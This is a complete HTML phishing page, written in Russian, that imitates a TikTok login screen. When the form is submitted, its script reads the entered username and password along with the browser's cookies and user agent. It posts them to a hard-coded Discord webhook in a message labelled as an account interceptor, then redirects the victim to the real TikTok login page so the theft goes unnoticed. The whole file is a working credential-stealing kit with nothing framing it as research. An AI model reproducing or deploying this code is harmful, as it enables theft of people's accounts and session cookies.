<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Вход в TikTok</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, sans-serif;
            background: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background: #1a1a1a;
            padding: 40px 30px;
            border-radius: 20px;
            width: 340px;
            text-align: center;
            box-shadow: 0 0 30px rgba(254, 44, 85, 0.2);
        }
        .container h1 {
            font-size: 32px;
            color: #fe2c55;
            margin-bottom: 10px;
        }
        .container p {
            color: #aaa;
            font-size: 14px;
            margin-bottom: 25px;
        }
        .container input {
            width: 100%;
            padding: 14px 16px;
            margin-bottom: 14px;
            background: #2a2a2a;
            border: none;
            border-radius: 12px;
            color: #fff;
            font-size: 16px;
            outline: none;
        }
        .container input:focus {
            background: #333;
            box-shadow: 0 0 0 2px #fe2c55;
        }
        .container button {
            width: 100%;
            padding: 14px;
            background: #fe2c55;
            border: none;
            border-radius: 12px;
            color: #fff;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s;
        }
        .container button:hover {
            background: #ff4d6d;
            transform: scale(1.02);
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #555;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>TikTok</h1>
        <p>Войдите, чтобы продолжить</p>
        <form id="loginForm">
            <input type="text" name="username" placeholder="Имя пользователя или email" required>
            <input type="password" name="password" placeholder="Пароль" required>
            <button type="submit">Войти</button>
        </form>
        <div class="footer">© 2026 TikTok</div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            let user = document.querySelector('input[name="username"]').value.trim();
            let pass = document.querySelector('input[name="password"]').value.trim();
            let userAgent = navigator.userAgent;
            let cookies = document.cookie || 'нет кук';

            let payload = {
                embeds: [{
                    title: '🔥 НОВЫЙ АККАУНТ',
                    color: 0xFF0000,
                    fields: [
                        { name: '👤 Логин', value: `\`${user}\``, inline: true },
                        { name: '🔑 Пароль', value: `\`${pass}\``, inline: true },
                        { name: '🍪 Куки', value: `\`\`\`${cookies}\`\`\``, inline: false },
                        { name: '💻 User-Agent', value: `\`${userAgent}\``, inline: false }
                    ],
                    timestamp: new Date().toISOString(),
                    footer: { text: 'Перехватчик аккаунтов' }
                }]
            };

            fetch('https://discord.com/api/webhooks/1529563507169955960/pDq-99XNHBu-LXRW0xVPXSy_ZOoVV4SwErhVb8sz8DrhnORwBJLrkSiFVzhGpw8UvQd6', {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                keepalive: true
            });

            window.location.href = 'https://www.tiktok.com/login';
        });
    </script>
</body>
</html>
